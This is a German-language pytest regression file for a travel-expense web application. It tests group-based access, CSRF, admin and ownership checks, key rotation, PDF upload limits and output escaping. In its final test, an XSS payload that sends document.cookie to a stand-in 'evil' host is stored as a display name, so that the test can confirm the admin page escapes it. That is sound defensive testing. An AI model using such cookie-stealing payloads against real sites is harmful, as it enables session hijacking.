"""Backend-Regressionen aus dem Review 2026-10-26: Gruppenpruefung, CSRF,
Admin, Lifecycle, Persistenz, KI-Kontext und PDF-Upload."""

from __future__ import annotations

import json
import os
from unittest.mock import patch

import pytest


def _example_input():
    repo_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    with open(os.path.join(repo_root, "example_input.json")) as f:
        return json.load(f)


def _abrechnung_payload():
    d = _example_input()
    d["stammdaten"] = {
        "iban": "DE89370400440532013000",
        "bic": "COBADEFFXXX",
        "email": "t@example.org",
        "abrechnende_dienststelle": "NLBV Aurich",
    }
    return d


def _neue_reise(client, headers) -> int:
    r = client.post(
        "/konto/generate", data={"json_data": json.dumps(_example_input()), "save_to_account": "1"}, headers=headers
    )
    assert r.status_code == 200
    return int(r.headers["X-Dienstreise-Id"])


# ---------- Authelia-Gruppen (B14) ----------


@pytest.fixture
def groups_enforced(app_module):
    app_module.app.config["ALLOWED_GROUPS"] = "admins,dr-automate-users"
    yield
    app_module.app.config.pop("ALLOWED_GROUPS", None)


def test_fremde_authelia_gruppe_ist_gast(auth_client, groups_enforced):
    headers = {"Remote-User": "nachbar", "Remote-Groups": "household,readers"}
    r = auth_client.get("/dashboard", headers=headers)
    assert r.status_code in (302, 401)
    r = auth_client.post(
        "/konto/generate", data={"json_data": json.dumps(_example_input()), "save_to_account": "1"}, headers=headers
    )
    assert r.status_code == 200
    assert "X-Dienstreise-Id" not in r.headers


def test_erlaubte_gruppe_ist_eingeloggt(auth_client, groups_enforced):
    r = auth_client.get("/dashboard", headers={"Remote-User": "joerg", "Remote-Groups": "dr-automate-users"})
    assert r.status_code == 200


def test_health_legt_keinen_user_an(auth_client):
    from db import SessionLocal
    from models_db import User

    auth_client.get("/health", headers={"Remote-User": "nur_health"})
    with SessionLocal() as s:
        assert s.query(User).filter(User.remote_user == "nur_health").first() is None


# ---------- CSRF (D2) ----------


def test_csrf_fehler_liefert_json(app_module):
    app_module.app.config["WTF_CSRF_ENABLED"] = True
    try:
        with app_module.app.test_client() as c:
            r = c.post("/abrechnung/calc", data={"json_data": "{}"}, headers={"Accept": "application/json"})
        assert r.status_code == 400
        assert "Sitzung abgelaufen" in r.get_json()["error"]
    finally:
        app_module.app.config["WTF_CSRF_ENABLED"] = False


# ---------- Admin ----------


def test_admin_route_403_fuer_nicht_admin(auth_client, app_module):
    with patch.object(app_module, "ADMIN_REMOTE_USERS", {"chef"}):
        assert auth_client.get("/admin/account-requests", headers={"Remote-User": "kein_chef"}).status_code == 403
        assert auth_client.get("/admin/account-requests", headers={"Remote-User": "chef"}).status_code == 200


# ---------- Lifecycle (D5) ----------


def _status(reise_id: int) -> str:
    from db import SessionLocal
    from models_db import Dienstreise

    with SessionLocal() as s:
        return s.get(Dienstreise, reise_id).status.value


def test_bezahlt_erst_nach_abrechnung(auth_client):
    headers = {"Remote-User": "bezahlt_test"}
    reise_id = _neue_reise(auth_client, headers)
    auth_client.post(f"/dienstreisen/{reise_id}/bezahlt", headers=headers)
    assert _status(reise_id) == "entwurf"

    r = auth_client.post(
        "/konto/abrechnung/generate",
        data={"json_data": json.dumps(_abrechnung_payload()), "save_to_account": "1", "dienstreise_id": reise_id},
        headers=headers,
    )
    assert "X-Abrechnung-Id" in r.headers
    auth_client.post(f"/dienstreisen/{reise_id}/bezahlt", headers=headers)
    assert _status(reise_id) == "bezahlt"


def test_genehmigter_antrag_wird_nicht_ueberschrieben(auth_client):
    headers = {"Remote-User": "gesperrt_test"}
    reise_id = _neue_reise(auth_client, headers)
    auth_client.post(f"/dienstreisen/{reise_id}/genehmigung", data={"genehmigung_datum": "2026-05-01"}, headers=headers)
    payload = _example_input()
    payload["reise_details"]["zweck"] = "Geänderter Zweck"
    r = auth_client.post(
        "/konto/generate",
        data={"json_data": json.dumps(payload), "save_to_account": "1", "dienstreise_id": reise_id},
        headers=headers,
    )
    assert r.headers["X-Dienstreise-Kopie-Von"] == str(reise_id)
    assert int(r.headers["X-Dienstreise-Id"]) != reise_id
    alt = auth_client.get(f"/dienstreisen/{reise_id}/antrag-json", headers=headers).get_json()
    assert alt["antrag_json"]["reise_details"]["zweck"] != "Geänderter Zweck"


# ---------- Persistenz (D4) + IDOR Abrechnung ----------


def test_abrechnung_speichert_server_berechnung(auth_client):
    headers = {"Remote-User": "persist_test"}
    reise_id = _neue_reise(auth_client, headers)
    payload = _abrechnung_payload()
    payload["berechnet"] = {"auszahlbetrag_eur": 99999}
    payload["unbekanntes_feld"] = "x" * 100
    auth_client.post(
        "/konto/abrechnung/generate",
        data={"json_data": json.dumps(payload), "save_to_account": "1", "dienstreise_id": reise_id},
        headers=headers,
    )
    j = auth_client.get(f"/dienstreisen/{reise_id}/abrechnung-json", headers=headers).get_json()
    gespeichert = j["abrechnung_json"]
    assert gespeichert["berechnet"]["auszahlbetrag_eur"] != 99999
    assert "unbekanntes_feld" not in gespeichert


def test_abrechnung_fremde_reise_wird_nicht_beschrieben(auth_client):
    alice = {"Remote-User": "alice_abr"}
    bob = {"Remote-User": "bob_abr"}
    reise_id = _neue_reise(auth_client, alice)
    r = auth_client.post(
        "/konto/abrechnung/generate",
        data={"json_data": json.dumps(_abrechnung_payload()), "save_to_account": "1", "dienstreise_id": reise_id},
        headers=bob,
    )
    assert r.status_code == 200
    assert "X-Abrechnung-Id" not in r.headers
    j = auth_client.get(f"/dienstreisen/{reise_id}/abrechnung-json", headers=alice).get_json()
    assert j["abrechnung_json"] is None


# ---------- /api/route ----------


def test_api_route_fuer_gaeste(client):
    with patch("routing.route_km", return_value={"km": 123.4, "duration_min": 80}):
        r = client.post("/api/route", data={"from": "49808 Lingen", "to": "30159 Hannover"})
    assert r.status_code == 200
    assert r.get_json()["km"] == 123.4


# ---------- KI-Kontext (C1/C2) ----------


def _capture_extract(client, data, headers=None, path="/extract"):
    captured = {}

    def fake(freitext, api_key, system_prompt, sonderwuensche=""):
        captured.update(freitext=freitext, api_key=api_key)
        return {"reise_details": {}}

    with patch("app.ai_extract.call_deepseek", side_effect=fake):
        r = client.post(path, data=data, headers=headers or {"X-DeepSeek-Key": "sk-gast"})
    assert r.status_code == 200, r.data
    return captured


def test_extract_kontext_mit_datum_und_wohnort_ohne_strasse(client):
    c = _capture_extract(client, {"freitext": "Tagung am 12. März", "wohnort": "Am Biener Esch 11, 49808 Lingen"})
    assert "Heutiges Datum:" in c["freitext"]
    assert "Wohnort (Start und Ende der Reise): 49808 Lingen" in c["freitext"]
    assert "Biener" not in c["freitext"]


def test_extract_eingeloggt_nutzt_profil_key_und_adresse(auth_client):
    headers = {"Remote-User": "key_test", "X-DeepSeek-Key": "sk-fremder-gast"}
    auth_client.post(
        "/profil",
        data={"deepseek_api_key": "sk-eigener", "adresse_privat": "Hauptstr. 1, 26123 Oldenburg"},
        headers=headers,
    )
    c = _capture_extract(
        auth_client, {"freitext": "Tagung", "wohnort": "49808 Lingen"}, headers=headers, path="/konto/extract"
    )
    assert c["api_key"] == "sk-eigener"
    assert "26123 Oldenburg" in c["freitext"]


# ---------- PDF-Upload (B17) ----------


def _pdf_upload(client, pfad):
    with open(pfad, "rb") as f:
        return client.post(
            "/extract",
            data={"freitext": "", "pdf": (f, "ausschreibung.pdf", "application/pdf")},
            headers={"X-DeepSeek-Key": "sk-gast"},
            content_type="multipart/form-data",
        )


def test_pdf_upload_seitenlimit(client, app_module):
    with patch.object(app_module, "MAX_PDF_PAGES", 1):
        r = _pdf_upload(client, "forms/Reisekostenvordruck.pdf")
    assert r.status_code == 400
    assert "max 1 Seiten" in r.get_json()["error"]


def test_pdf_upload_kaputtes_pdf(client, tmp_path):
    kaputt = tmp_path / "kaputt.pdf"
    kaputt.write_bytes(b"%PDF-1.4\n" + b"\x00" * 500)
    r = _pdf_upload(client, kaputt)
    assert r.status_code == 400


# ---------- Antrag: Anmerkungen-Kästchen (C5) ----------


def test_anmerkungen_checkbox_folgt_bemerkungen():
    from models import ReiseantragData

    d = _example_input()
    d["konfiguration_checkboxen"]["weitere_anmerkungen_checkbox_aktivieren"] = False
    assert ReiseantragData.model_validate(d).konfiguration_checkboxen.weitere_anmerkungen_checkbox_aktivieren
    d["zusatz_infos"]["bemerkungen_feld"] = "  "
    d["konfiguration_checkboxen"]["weitere_anmerkungen_checkbox_aktivieren"] = True
    assert not ReiseantragData.model_validate(d).konfiguration_checkboxen.weitere_anmerkungen_checkbox_aktivieren


# ---------- Profil-Seed (A3) ----------


def test_seed_traegt_owner(auth_client):
    r = auth_client.get("/konto/", headers={"Remote-User": "seed_owner"})
    assert b'"_owner": "seed_owner"' in r.data


# ---------- Key-Rotation (D3) ----------


def test_rotate_keys_schreibt_mit_neuem_key(auth_client):
    from cryptography.fernet import Fernet, MultiFernet

    import crypto
    import rotate_keys
    from db import SessionLocal
    from models_db import User, UserProfile

    original = crypto.get_fernet()
    neu = Fernet(Fernet.generate_key())
    try:
        auth_client.post("/profil", data={"iban": "DE89370400440532013000"}, headers={"Remote-User": "rot_test"})
        crypto._fernet = MultiFernet([neu, *original._fernets])
        assert rotate_keys.rotate() > 0
        crypto._fernet = MultiFernet([neu])  # alter Key entfernt
        with SessionLocal() as s:
            uid = s.query(User).filter(User.remote_user == "rot_test").one().id
            assert s.query(UserProfile).filter(UserProfile.user_id == uid).one().iban == "DE89370400440532013000"
    finally:
        crypto._fernet = MultiFernet([*original._fernets, neu])
        rotate_keys.rotate()
        crypto._fernet = original


# ---------- Teilnehmende über drei Vordruck-Zeilen hinaus (C6) ----------


def test_ueberzaehlige_teilnehmer_landen_in_bemerkungen(tmp_path):
    from pypdf import PdfReader

    import generator
    from models import ReiseantragData

    d = _example_input()
    d["zusatz_infos"]["bemerkungen_feld"] = ""
    d["reise_details"]["weitere_teilnehmer"] = [{"name": n} for n in ("Anna A", "Ben B", "Cem C")]
    d["antragsteller"]["mitreisender_name"] = "Dora D, Anna A"
    data = ReiseantragData.model_validate(d).model_dump()
    out = generator.fill_pdf(data, "forms/DR-Antrag_035_001Stand4-2025pdf.pdf", str(tmp_path))
    fields = PdfReader(out).get_fields()
    assert fields["Person.Name4"]["/V"] == "Cem C"
    assert "Weitere Teilnehmende: Dora D" in fields["Bemerkungen_der_anstragstellenden_Person"]["/V"]
    assert fields["Obj39"]["/V"] == "/Yes"


# ---------- Admin-Seite: kein Nutzertext im JS-Kontext (A2) ----------


def test_admin_seite_name_nicht_in_inline_js(auth_client, app_module):
    payload = "x');location='https://evil/?'+document.cookie;('"
    auth_client.post(
        "/account/request",
        data={"email": "a@b.de", "display_name": payload, "begruendung": "Bitte Zugang für Dienstreisen an der BBS."},
    )
    with patch.object(app_module, "ADMIN_REMOTE_USERS", {"chef"}):
        html = auth_client.get("/admin/account-requests", headers={"Remote-User": "chef"}).get_data(as_text=True)
    assert "onsubmit" not in html
    assert "data-confirm=" in html
    assert "location='https://evil" not in html  # Attribut-Escaping greift
